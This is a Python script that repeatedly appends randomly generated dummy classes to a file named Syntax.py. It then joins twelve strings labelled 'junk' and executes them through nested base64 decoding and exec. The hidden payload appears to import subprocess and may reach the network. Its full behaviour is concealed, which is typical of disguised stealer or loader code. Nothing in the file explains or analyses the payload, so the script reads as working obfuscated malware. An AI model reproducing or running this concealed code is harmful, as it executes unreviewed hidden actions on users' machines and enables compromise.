import random
import string
import base64
import subprocess

junk1 = 'aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2FXMXdiM0owSUdKaGMyVTJORHRsZUdWaktHSmhjMlUyTkM1aU5qUm'
junk2 = 'taV052WkdVb1lubDBaWE1vSjJGWE1YZGlNMG93U1VoT01WbHVRbmxpTWs1c1l6Tk5TMkZYTVhkaU0wb3dTVWhTY0dKWFZVdGFia3AyWWxOQ2VWcFlSakZhV0U0d1kzbENj'
junk3 = 'R0pZUW5aamJsRm5XakpXTUVObmNHdGFWMWxuWTI1V2RWZ3lWalJrUjFaNVltMUdjMWd5VG5aYVIxVnZaRmhLYzB0VWIwdEpRMEZuU1VoU2VXVlViMHRKUTBGblNVTkJaMG'
junk4 = 'xEUW1waU1sSnNTVVF3WjJNelZtbGpTRXAyV1RKV2VtTjVOV3BoUjFacVlURTVkbVJZVW5ka1dGRnZWM2xrYW1SWVNuTktlWGRuU25reGVrcDVkMmRrV0VweldGTjNaMlJY'
junk5 = 'TlhCa2JWWjVZekpHYzFneU5XeGtNbmh3WW0xV2VsQldVbmxrVjFWd1EybEJaMGxEUVdkSlEwRm5XbGhvYkZsNWFHcGlNbEpzUzFGdlowbERRV2RhV0docVdsaENNRWxGVm'
junk6 = 'pSWk1sWjNaRWRzZG1KcFFtaGplVUpzVDJkdlowbERRV2RKUTBGblNVaENhR016VFdkSlEwMW5VMWRrZFdJelNteEpSMVo1WTIwNWVXTjVRbnBoVjNoc1ltNVNjMlZSYjB0'
junk7 = 'YVIxWnRTVWN4YUdGWE5HOUxWRzlMU1VOQlowbElWbmxpUTBFNVNVTmtiMlJJVW5kamVtOTJURE5LYUdSNU5XNWhXRkp2WkZkS01XTXlWbmxaTWpsMVpFZFdkV1JETldwaU'
junk8 = '1qQjJXVmRXZVUxSFpHeGlRemt3V2xoT01FeFhiRzVpYlRsNVdsTTVkRmxYYkhWTU0xSnNZek5SZFdOSWEyNURaMjluU1VOQloyTXpWbWxqU0VwMldUSldlbU41TlZGaU0w'
junk9 = 'SnNZbWxvWWtvelFqVmtSMmgyWW1samMwbERZM1JaZVdOelNVZFpibHBZYUd4WmVXZzNXakpXTUV0SVZubGlRMnQxWkVkV05HUkRSbmxtVTJ0dVdGTjNaMWt6U214WldGSn'
junk10 = 'dZakkxYldKSFJtNWplakY2WkZkS2QyTnRPV3BhV0U1NlRHdE9VMUpWUmxWU1ZqbFBWREU1V0ZOVk5VVlVNV053UTJkdlowbERRV2RhYlRsNVNVZHJaMkZYTkdkamJVWjFX'
junk11 = 'akpWYjAxNWF6WkRhVUZuU1VOQlowbERRV2RrUjJ4MFdsTTFlbUpIVm14alEyZDRTMUZ2UzJGWFdXZFlNVGwxV1ZjeGJGZ3hPR2RRVkRCblNXdzVabUpYUm5CaWJEbG1TV3'
junk12 = 'B2UzBsRFFXZEpSekZvWVZjMGIwdFJiejBuTENkVlZFWXRPQ2NwS1M1a1pXTnZaR1VvS1NrPScsJ1VURi04JykpLmRlY29kZSgpKQ'


def junk(code):
    newcode = "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    newcode += code + "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    return newcode
with open("Syntax.py", "a") as f:
    
    f.write(junk(""))
def junk(code):
    newcode = "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    newcode += code + "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    return newcode
with open("Syntax.py", "a") as f:
    
    f.write(junk(""))
def junk(code):
    newcode = "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    newcode += code + "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    return newcode
with open("Syntax.py", "a") as f:
    
    f.write(junk(""))
junk_main = junk1 + junk2 + junk3 + junk4 + junk5 + junk6 + junk7 + junk8 + junk9 + junk10 + junk11 + junk12 + '=='
exec(base64.b64decode(bytes(junk_main, 'UTF-8')).decode())